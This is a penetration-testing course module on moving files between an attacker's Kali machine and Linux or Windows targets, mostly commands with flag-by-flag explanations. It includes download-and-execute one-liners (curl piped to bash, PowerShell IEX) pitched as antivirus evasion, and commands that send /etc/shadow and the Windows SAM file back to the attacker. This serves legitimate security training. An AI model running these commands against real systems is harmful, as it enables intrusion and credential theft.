# 11 — File Transfers

You'll transfer files constantly during a pentest — tools to the target, loot back to Kali, payloads for exploitation, scripts for enumeration. Fumbling with transfers wastes time. This module covers every method for every situation.

---

## Kali → Linux Target

### Method 1: Python HTTP server + wget (most common)

**On Kali — start a web server in the directory with your files:**

```bash
cd ~/tools                    # directory containing the files you want to serve
python3 -m http.server 80     # start HTTP server on port 80
```

**What this does:** `python3 -m http.server` starts a simple HTTP file server. The `-m` flag means "run this module." Port 80 is the default HTTP port — using it means you don't need to specify a port in the download URL. The server lists and serves every file in the current directory.

**On the target — download:**

```bash
wget http://192.168.244.129/linpeas.sh
```

**What wget does:** `wget` downloads files from the web. It sends an HTTP GET request to the URL and saves the response as a file. The filename comes from the URL (the part after the last `/`).

```bash
# Save with a different name
wget http://192.168.244.129/linpeas.sh -O /tmp/scan.sh
# -O = output filename (capital O, not zero)

# Download silently (no progress bar)
wget http://192.168.244.129/linpeas.sh -q
# -q = quiet

# Download to a specific directory
wget http://192.168.244.129/linpeas.sh -P /tmp/
# -P = prefix directory (where to save)
```

**If wget is not installed, use curl:**

```bash
curl http://192.168.244.129/linpeas.sh -o linpeas.sh
# -o = output filename (lowercase o)
# Without -o, curl prints the file content to the terminal instead of saving it

# Download and execute without saving (for scripts)
curl http://192.168.244.129/linpeas.sh | bash
# Downloads the script and pipes it directly to bash for execution
# The script runs but is never saved to disk (stealthier)

# Follow redirects
curl -L http://192.168.244.129/file -o file
# -L = follow HTTP redirects (301/302)
```

**If neither wget nor curl is installed:**

```bash
# Python (almost always available)
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.244.129/linpeas.sh', 'linpeas.sh')"

# Python 2 (older systems)
python -c "import urllib; urllib.urlretrieve('http://192.168.244.129/linpeas.sh', 'linpeas.sh')"
```

**If port 80 is blocked by a firewall:**

```bash
# On Kali — use a different port
python3 -m http.server 443       # HTTPS port (often allowed)
python3 -m http.server 53        # DNS port (usually allowed)
python3 -m http.server 8080      # common alternative HTTP port

# On target — specify the port
wget http://192.168.244.129:443/linpeas.sh
wget http://192.168.244.129:8080/linpeas.sh
```

### Method 2: SCP (requires SSH access)

```bash
# From Kali, copy a file TO the target
scp linpeas.sh user@192.168.244.132:/tmp/linpeas.sh
```

**What scp does:** Secure Copy Protocol — copies files over an SSH connection. It's encrypted, reliable, and works in both directions. You need SSH credentials for the target.

```bash
# Copy a file FROM the target to Kali
scp user@192.168.244.132:/etc/passwd ./loot/

# Copy an entire directory recursively
scp -r ~/tools/ user@192.168.244.132:/tmp/tools/
# -r = recursive (copy the whole directory)

# Non-standard SSH port
scp -P 2222 linpeas.sh user@target:/tmp/
# -P = port (capital P — different from ssh which uses lowercase -p)

# Copy through a jump host (when target is on internal network)
scp -J user@192.168.244.131 linpeas.sh user@172.16.0.2:/tmp/
# -J = jump host — SCP goes through the first host to reach the second
```

**When to use SCP:**
- You already have SSH credentials
- You need encrypted transfer
- The target has restricted internet access but allows SSH
- You need to transfer large files reliably

### Method 3: Netcat (when nothing else works)

Netcat transfers raw data over a TCP connection. No protocol overhead — just bytes.

```bash
# RECEIVER — set up first (waits for incoming data)
# On target:
nc -lvnp 9999 > linpeas.sh
```

**What each flag does:**
```
-l    Listen mode (wait for incoming connections)
-v    Verbose (show connection info)
-n    No DNS resolution (faster, use IPs)
-p    Port to listen on
>     Redirect received data to a file
```

```bash
# SENDER — connect and send the file
# On Kali:
nc 192.168.244.132 9999 < linpeas.sh
```

The `<` operator sends the file contents through the netcat connection. When the file is fully sent, the connection stays open — press `Ctrl+C` to close it.

**Reverse direction (target sends file to Kali):**

```bash
# On Kali (receiver):
nc -lvnp 9999 > stolen_shadow.txt

# On target (sender):
nc 192.168.244.129 9999 < /etc/shadow
```

**Verifying the transfer (for binary files):**

```bash
# Check file integrity with MD5
# On sender:
md5sum linpeas.sh
# d41d8cd98f00b204e9800998ecf8427e

# On receiver:
md5sum linpeas.sh
# d41d8cd98f00b204e9800998ecf8427e  ← must match!
```

If the hashes don't match, the transfer was corrupted. Try again.

### Method 4: Base64 (through a shell, no tools needed)

When you have a command shell but no file transfer tools:

```bash
# On Kali — encode the file to base64
base64 -w 0 linpeas.sh
# Outputs a long string of characters like: IyEvYmluL2Jhc2gKCmN1cmw...
```

**What `-w 0` does:** Normally, base64 wraps output at 76 characters (adds newlines). `-w 0` means "no wrapping" — output is one continuous line. This is important because newlines in the middle of the string would break the decode on the target.

```bash
# On target — decode the base64 string back to a file
echo "IyEvYmluL2Jhc2gKCmN1cmw..." | base64 -d > linpeas.sh
chmod +x linpeas.sh
```

**For binary files (like compiled exploits):**

```bash
# On Kali
base64 -w 0 exploit_binary > encoded.txt
cat encoded.txt   # copy this output

# On target
echo "PASTE_THE_ENCODED_STRING_HERE" | base64 -d > exploit_binary
chmod +x exploit_binary

# Verify integrity
md5sum exploit_binary    # compare with Kali's md5sum
```

**When to use base64:**
- You only have a restricted shell (web shell, limited command execution)
- Firewall blocks all file transfer protocols
- The file is small (base64 adds 33% to the size — a 1MB file becomes 1.33MB of text)
- You can't establish a direct connection to Kali

**When NOT to use base64:**
- Large files (the base64 string is massive and hard to paste without errors)
- Binary files over 50KB (use another method)

---

## Kali → Windows Target

### Method 1: certutil (available on every Windows)

```cmd
certutil -urlcache -f http://192.168.244.129/winpeas.exe C:\temp\winpeas.exe
```

**What certutil is:** A Windows utility for managing certificates. The `-urlcache -f` flags abuse its ability to download files from URLs. It's not designed for file transfer, but it works and it's available on every Windows version.

```
certutil                The command
-urlcache              Use the URL cache functionality
-f                     Force download (overwrite if exists)
http://...             URL to download from
C:\temp\winpeas.exe    Where to save the file
```

**Antivirus note:** AV products increasingly flag certutil downloads as suspicious. If it gets blocked, use PowerShell or SMB instead.

### Method 2: PowerShell (most flexible)

```powershell
# Method 1: Invoke-WebRequest (most common)
Invoke-WebRequest http://192.168.244.129/winpeas.exe -OutFile C:\temp\winpeas.exe
# Short form:
iwr http://192.168.244.129/winpeas.exe -o C:\temp\winpeas.exe
```

**What Invoke-WebRequest does:** PowerShell's built-in HTTP client. Sends a GET request and saves the response body to a file. `-OutFile` (or `-o`) specifies where to save.

```powershell
# Method 2: WebClient (works in older PowerShell versions)
(New-Object Net.WebClient).DownloadFile('http://192.168.244.129/winpeas.exe', 'C:\temp\winpeas.exe')

# Method 3: Download and execute in memory (scripts only)
IEX(New-Object Net.WebClient).DownloadString('http://192.168.244.129/PowerUp.ps1')
```

**What `IEX` does:** `Invoke-Expression` — takes a string and executes it as PowerShell code. Combined with `DownloadString`, it downloads a PowerShell script and runs it in memory without ever saving to disk. This is how you run PowerView, PowerUp, and Invoke-Mimikatz without triggering file-based antivirus.

### Method 3: SMB server (best for Windows — no tools needed on target)

```bash
# On Kali — start an SMB share pointing at your tools directory
impacket-smbserver share ~/tools -smb2support
```

**What this does:** Creates a Windows-compatible file share on Kali. The Windows target can access it using standard UNC paths (`\\KALI_IP\share\`), just like any network drive. No additional software needed on the Windows side.

```
share             The share name (you choose this)
~/tools           The directory to share
-smb2support      Enable SMB2 (required for modern Windows — SMB1 is disabled by default)
```

```cmd
:: On Windows — copy files FROM Kali's share
copy \\192.168.244.129\share\winpeas.exe C:\temp\
dir \\192.168.244.129\share\

:: Copy files TO Kali's share (exfiltration)
copy C:\Users\admin\Desktop\proof.txt \\192.168.244.129\share\
```

**If Windows requires authentication:**

```bash
# On Kali — SMB server with credentials
impacket-smbserver share ~/tools -smb2support -user test -password test
```

```cmd
:: On Windows — authenticate first
net use \\192.168.244.129\share /user:test test
copy \\192.168.244.129\share\winpeas.exe C:\temp\

:: Disconnect when done
net use \\192.168.244.129\share /delete
```

### Method 4: Bitsadmin (when certutil and PowerShell are blocked)

```cmd
bitsadmin /transfer job /download /priority high http://192.168.244.129/winpeas.exe C:\temp\winpeas.exe
```

**What bitsadmin is:** Windows Background Intelligent Transfer Service. Normally used for Windows Update downloads. Slower than certutil or PowerShell, but less likely to be flagged by antivirus.

### Method 5: Base64 through PowerShell

```powershell
# On Kali — encode the file
base64 -w 0 winpeas.exe > encoded.txt

# On Windows — decode
$encoded = "BASE64_STRING_HERE"
[System.IO.File]::WriteAllBytes("C:\temp\winpeas.exe", [Convert]::FromBase64String($encoded))
```

---

## Target → Kali (Exfiltrating Data)

### Linux target → Kali

```bash
# SCP (if you have SSH)
scp /etc/shadow kali_user@192.168.244.129:/tmp/loot/

# Netcat
# On Kali: nc -lvnp 9999 > shadow.txt
# On target: nc 192.168.244.129 9999 < /etc/shadow

# Python HTTP server (serve from the target, download on Kali)
# On target:
cd /tmp && python3 -m http.server 8080
# On Kali:
wget http://TARGET:8080/interesting_file.txt

# Base64 (just display and copy-paste)
base64 -w 0 /etc/shadow
# Copy the output, paste on Kali, decode
```

### Windows target → Kali

```cmd
:: SMB (easiest)
:: Kali: impacket-smbserver share /tmp/loot -smb2support
copy C:\Users\admin\Desktop\proof.txt \\192.168.244.129\share\
copy C:\Windows\System32\config\SAM \\192.168.244.129\share\

:: PowerShell upload via POST
:: Kali: set up a receiver (python script or nc)
:: Windows:
powershell -c "(New-Object Net.WebClient).UploadFile('http://192.168.244.129/upload','C:\temp\loot.txt')"
```

---

## Making Downloaded Files Executable

```bash
# Linux — add execute permission
chmod +x linpeas.sh
chmod +x exploit

# Then run
./linpeas.sh
./exploit
```

Windows executables don't need this step — `.exe` files are executable by default.

**Common mistake:** Forgetting `chmod +x`. If you run `./script.sh` and get "Permission denied," it's almost always this.

---

## Quick Decision Guide

```
KALI → LINUX:
  SSH access?          → scp (fastest, encrypted)
  wget/curl on target? → python3 -m http.server + wget/curl (most reliable)
  No tools?            → nc or base64

KALI → WINDOWS:
  SMB works?           → impacket-smbserver (no tools needed on target)
  HTTP works?          → python3 http.server + certutil or PowerShell
  Everything blocked?  → base64 through PowerShell

TARGET → KALI:
  SMB?                 → copy to \\KALI\share\
  SSH?                 → scp back to Kali
  Nothing?             → nc or base64
```

---

## Exam Tips

1. **Start your Python HTTP server at the beginning of the exam** and leave it running. You'll transfer files constantly.

2. **Have your tools directory ready** with everything you'll need: linpeas, winpeas, chisel, PowerUp, nc, reverse shells.

3. **Use SMB for Windows targets.** It's the most reliable method — no software needed on the target, handles binary files correctly, works for both upload and download.

4. **Verify binary transfers with md5sum.** A corrupted binary will crash or behave unpredictably. Always check the hash.

5. **If port 80 is blocked, try 443 or 8080.** Firewalls often allow HTTPS ports.

6. **Know at least 3 methods for each direction.** If your primary method fails, switch to the backup immediately. Don't waste time debugging — try a different method.
